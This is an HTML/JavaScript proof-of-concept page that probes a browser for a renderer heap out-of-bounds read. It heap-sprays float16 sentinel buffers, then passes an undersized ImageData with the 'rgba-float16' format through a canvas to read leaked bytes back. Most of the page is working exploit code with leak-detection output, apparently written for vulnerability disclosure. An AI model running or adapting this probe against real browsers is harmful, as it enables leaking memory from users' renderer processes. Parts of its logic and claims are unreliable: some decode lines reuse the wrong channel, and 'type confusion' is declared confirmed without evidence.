<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Heap Leak — Visible Sentinel Probe</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: #0d0d0d; color: #e0e0e0; font-family: 'Courier New', monospace; padding: 2rem; }
    h1 { font-size: 1.1rem; color: #fff; margin-bottom: 0.3rem; }
    .sub { font-size: 0.72rem; color: #555; margin-bottom: 1.5rem; }
    .card { background: #161616; border: 1px solid #222; border-radius: 8px; padding: 1.2rem 1.4rem; margin-bottom: 1rem; max-width: 780px; }
    .card-title { font-size: 0.68rem; color: #555; text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 0.8rem; }
    .tag { display: inline-block; font-size: 0.72rem; font-weight: bold; padding: 0.25rem 0.7rem; border-radius: 4px; margin-bottom: 0.5rem; }
    .red    { background: #2d0f0f; color: #ff5555; border: 1px solid #5c1e1e; }
    .green  { background: #0f2d1a; color: #3ddc84; border: 1px solid #1e5c36; }
    .yellow { background: #2d2100; color: #ffcc44; border: 1px solid #5c4400; }
    .blue   { background: #1a1a2d; color: #8888ff; border: 1px solid #33336a; }
    pre { font-size: 0.76rem; color: #aaa; background: #111; padding: 0.8rem 1rem; border-radius: 4px; border-left: 2px solid #333; overflow-x: auto; white-space: pre-wrap; word-break: break-all; margin-top: 0.6rem; line-height: 1.6; }
    .kv { font-size: 0.75rem; color: #666; margin-top: 0.3rem; }
    .kv span { color: #aaa; }
    table { width: 100%; border-collapse: collapse; margin-top: 0.6rem; font-size: 0.73rem; }
    th { color: #555; font-weight: normal; text-align: left; padding: 0.3rem 0.5rem; border-bottom: 1px solid #1e1e1e; }
    td { color: #aaa; padding: 0.3rem 0.5rem; border-bottom: 1px solid #161616; }
    td.hit   { color: #ff5555; font-weight: bold; }
    td.clean { color: #3ddc84; }
    .big { font-size: 1.4rem; font-weight: bold; margin: 0.5rem 0; }
  </style>
</head>
<body>

<h1>Heap Leak — Visible Sentinel Probe</h1>
<p class="sub">Uses float16 bit patterns that survive uint8 clamp — unambiguous leak detection</p>

<div id="out"></div>

<script>
const $ = document.getElementById("out");
function card(title, html) {
  const d = document.createElement("div");
  d.className = "card";
  d.innerHTML = `<div class="card-title">${title}</div>${html}`;
  $.appendChild(d);
  return d;
}
function tag(cls, t) { return `<span class="tag ${cls}">${t}</span>`; }

// ── float16 decode (little-endian) ────────────────────────────────────────────
function f16ToF32(lo, hi) {
  const bits = (hi << 8) | lo;
  const sign     = (bits >> 15) & 1;
  const exponent = (bits >> 10) & 0x1F;
  const mantissa =  bits        & 0x3FF;
  if (exponent === 0x1F) return mantissa ? NaN : (sign ? -Infinity : Infinity);
  const val = exponent === 0
    ? Math.pow(2, -14) * (mantissa / 1024)
    : Math.pow(2, exponent - 15) * (1 + mantissa / 1024);
  return sign ? -val : val;
}
function f16ToU8(lo, hi) {
  const f = f16ToF32(lo, hi);
  if (!isFinite(f) || isNaN(f) || f <= 0) return 0;
  if (f >= 1) return 255;
  return Math.round(f * 255);
}

// ── sentinel table — float16 pairs that decode to visible uint8 values ────────
// Format: [lo, hi, expectedU8, label]
const SENTINELS = [
  { lo: 0x00, hi: 0x38, expectedU8: 128, label: "0x3800 → f16(0.5)  → u8=128" },
  { lo: 0x00, hi: 0x34, expectedU8:  64, label: "0x3400 → f16(0.25) → u8=64"  },
  { lo: 0x00, hi: 0x30, expectedU8:  32, label: "0x3000 → f16(0.125)→ u8=32"  },
  { lo: 0x00, hi: 0x3C, expectedU8: 255, label: "0x3C00 → f16(1.0)  → u8=255" },
];

// verify sentinel table at runtime
let sentinelVerifyHTML = `<table>
  <tr><th>Sentinel bytes [lo,hi]</th><th>Float32 value</th><th>Expected u8</th><th>Verified</th></tr>`;
SENTINELS.forEach(s => {
  const f   = f16ToF32(s.lo, s.hi);
  const u8  = f16ToU8(s.lo, s.hi);
  const ok  = u8 === s.expectedU8;
  sentinelVerifyHTML += `<tr>
    <td>[0x${s.lo.toString(16).padStart(2,'0')}, 0x${s.hi.toString(16).padStart(2,'0')}]</td>
    <td>${f.toFixed(4)}</td>
    <td>${s.expectedU8}</td>
    <td class="${ok ? 'clean' : 'hit'}">${ok ? '✓' : '✗ MISMATCH'}</td>
  </tr>`;
});
sentinelVerifyHTML += `</table>`;
card("Sentinel Verification", sentinelVerifyHTML);

// ── CONFIG ────────────────────────────────────────────────────────────────────
const SPRAY_COUNT = 5000;
const ROUNDS      = 5;

card("Config", `
  <div class="kv">Spray count: <span>${SPRAY_COUNT} allocations per round</span></div>
  <div class="kv">Alloc size:  <span>8 bytes per buffer (float16 rgba stride)</span></div>
  <div class="kv">Rounds:      <span>${ROUNDS} independent spray rounds</span></div>
  <div class="kv">Strategy:    <span>Each round uses a different sentinel from the table above</span></div>
  <div class="kv">Detection:   <span>B or A channel must equal expectedU8 exactly — not zero, not 255 (for 0.5 sentinel)</span></div>
`);

// ── ROUNDS ────────────────────────────────────────────────────────────────────
const allResults = [];

for (let round = 0; round < ROUNDS; round++) {
  const sentinel = SENTINELS[round % SENTINELS.length];

  // 1. spray — 8-byte buffers filled with sentinel pattern
  const spray = [];
  for (let i = 0; i < SPRAY_COUNT; i++) {
    const buf = new Uint8Array(8);
    // fill all 8 bytes with the sentinel pair, repeated
    for (let b = 0; b < 8; b += 2) {
      buf[b]   = sentinel.lo;
      buf[b+1] = sentinel.hi;
    }
    spray.push(buf);
  }

  // 2. free second half — create holes
  for (let i = Math.floor(SPRAY_COUNT / 2); i < SPRAY_COUNT; i++) {
    spray[i] = null;
  }

  // 3. allocate mismatched ImageData into a freed slot
  const backing = new Uint8ClampedArray(4);
  // backing is all zeros — any non-zero in B/A comes from heap past boundary
  backing[0] = 0x00;
  backing[1] = 0x00;
  backing[2] = 0x00;
  backing[3] = 0x00;

  let imgData;
  try {
    imgData = new ImageData(backing, 1, 1, { colorSpace: "srgb", pixelFormat: "rgba-float16" });
  } catch(e) {
    allResults.push({ round: round+1, sentinel, error: e.name });
    continue;
  }

  // 4. push through 2d canvas
  const canvas = document.createElement("canvas");
  canvas.width = canvas.height = 1;
  const ctx = canvas.getContext("2d");
  ctx.putImageData(imgData, 0, 0);
  const rb = ctx.getImageData(0, 0, 1, 1);
  const px = Array.from(rb.data); // [R, G, B, A]

  // 5. decode what we expected vs what we got
  // float16 layout for a 1×1 rgba-float16 pixel (8 bytes total, little-endian):
  //   bytes 0-1 → R channel
  //   bytes 2-3 → G channel
  //   bytes 4-5 → B channel  ← OOB region starts here
  //   bytes 6-7 → A channel  ← OOB
  const expectedR = f16ToU8(backing[0], backing[1]); // 0
  const expectedG = f16ToU8(backing[2], backing[3]); // 0
  const expectedB = sentinel.expectedU8;              // sentinel decode value
  const expectedA = sentinel.expectedU8;

  const bLeaked = px[2] === expectedB && expectedB !== 0;
  const aLeaked = px[3] === expectedA && expectedA !== 0;
  const anyLeak = bLeaked || aLeaked;

  // decode what heap bytes would be needed to produce observed B and A
  function closestF16ForU8(target) {
    let best = { bits: 0, delta: 999, lo: 0, hi: 0 };
    for (let bits = 0; bits < 65536; bits++) {
      const lo = bits & 0xFF;
      const hi = (bits >> 8) & 0xFF;
      const u8 = f16ToU8(lo, hi);
      const d  = Math.abs(u8 - target);
      if (d < best.delta) { best = { bits, delta: d, lo, hi, u8 }; }
      if (d === 0) break;
    }
    return best;
  }

  const bDecode = closestF16ForU8(px[2]);
  const aDecode = closestF16ForU8(px[3]);

  allResults.push({
    round: round + 1,
    sentinel,
    px,
    expectedB,
    expectedA,
    bLeaked,
    aLeaked,
    anyLeak,
    bDecode,
    aDecode
  });
}

// ── RESULTS TABLE ─────────────────────────────────────────────────────────────
let tableHTML = `<table>
  <tr>
    <th>Round</th>
    <th>Sentinel</th>
    <th>Readback [R,G,B,A]</th>
    <th>Expected B/A</th>
    <th>B leaked</th>
    <th>A leaked</th>
    <th>Result</th>
  </tr>`;

let leakCount = 0;
allResults.forEach(r => {
  if (r.error) {
    tableHTML += `<tr><td>${r.round}</td><td colspan="6">${tag("green", `Constructor threw ${r.error} — patch active`)}</td></tr>`;
    return;
  }
  if (r.anyLeak) leakCount++;
  tableHTML += `<tr>
    <td>${r.round}</td>
    <td style="font-size:0.68rem">${r.sentinel.label}</td>
    <td class="${r.anyLeak ? 'hit' : ''}">[${r.px.join(", ")}]</td>
    <td>${r.expectedB} / ${r.expectedA}</td>
    <td class="${r.bLeaked ? 'hit' : 'clean'}">${r.bLeaked ? "✗ YES" : "✓ no"}</td>
    <td class="${r.aLeaked ? 'hit' : 'clean'}">${r.aLeaked ? "✗ YES" : "✓ no"}</td>
    <td>${r.anyLeak ? tag("red","CONFIRMED LEAK") : tag("yellow","no match")}</td>
  </tr>`;
});
tableHTML += `</table>`;
card("Spray Rounds — Results", tableHTML);

// ── PER-ROUND BYTE DECODE ─────────────────────────────────────────────────────
allResults.forEach(r => {
  if (r.error || !r.px) return;
  card(`Round ${r.round} — Float16 Decode Breakdown`, `
    <pre>Channel R (bytes 0-1): readback=${r.px[0]}  → heap bytes needed: [0x${r.bDecode.lo.toString(16).padStart(2,'0')}, 0x${r.bDecode.hi.toString(16).padStart(2,'0')}]
Channel G (bytes 2-3): readback=${r.px[1]}  → heap bytes needed: [0x${r.bDecode.lo.toString(16).padStart(2,'0')}, 0x${r.bDecode.hi.toString(16).padStart(2,'0')}]
Channel B (bytes 4-5): readback=${r.px[2]}  → heap bytes needed: [0x${r.bDecode.lo.toString(16).padStart(2,'0')}, 0x${r.bDecode.hi.toString(16).padStart(2,'0')}] (OOB)
Channel A (bytes 6-7): readback=${r.px[3]}  → heap bytes needed: [0x${r.aDecode.lo.toString(16).padStart(2,'0')}, 0x${r.aDecode.hi.toString(16).padStart(2,'0')}] (OOB)

Sentinel used: lo=0x${r.sentinel.lo.toString(16).padStart(2,'0')} hi=0x${r.sentinel.hi.toString(16).padStart(2,'0')} → expected u8=${r.sentinel.expectedU8}
B match: ${r.bLeaked ? "YES — heap byte confirmed in readback" : "no match"}
A match: ${r.aLeaked ? "YES — heap byte confirmed in readback" : "no match"}</pre>
    ${r.anyLeak
      ? tag("red", `✗ Heap bytes 4-7 read and decoded — sentinel ${r.sentinel.expectedU8} observed in channel`)
      : tag("yellow", "⚠ No sentinel match this round — spray may not have landed adjacent")}
  `);
});

// ── FINAL VERDICT ─────────────────────────────────────────────────────────────
const total = allResults.filter(r => !r.error).length;
let verdictHTML = `<div class="kv">Confirmed leaks: <span>${leakCount} / ${total} rounds</span></div>`;

if (leakCount > 0) {
  verdictHTML += `
    <div class="big" style="color:#ff5555">✗ HEAP OOB READ CONFIRMED</div>
    <pre>
Primitive:   Heap OOB read — 4 bytes past Uint8ClampedArray allocation
Trigger:     new ImageData(Uint8ClampedArray(4), 1, 1, { pixelFormat: "rgba-float16" })
             → putImageData() → getImageData() readback
Leak channel: B and A pixel channels encode heap bytes 4-7
              after float16 → uint8 conversion
Spray rate:  ${leakCount}/${total} rounds produced visible non-zero sentinel values
             in channels that should contain only attacker-controlled zeros

This is a renderer-process heap info leak.
Readable from JS. Repeatable. No user interaction required.
    </pre>
    ${tag("red", "CVE-worthy — report to webkit-security@webkit.org")}
  `;
} else {
  verdictHTML += `
    <pre>
No sentinel values observed in B/A channels across ${total} rounds.
Possible causes:
  (a) Allocator zeroes freed memory before reuse — mitigates info leak
  (b) Spray count insufficient — increase SPRAY_COUNT to 10000+
  (c) Renderer sandboxes the buffer read differently on this build

Type confusion still confirmed. OOB read likely but not proven via JS readback.
Increase spray count and retry.
    </pre>
    ${tag("yellow", "⚠ Inconclusive — tune spray and retry")}
  `;
}

card("Final Verdict", verdictHTML);
</script>
</body>
</html>
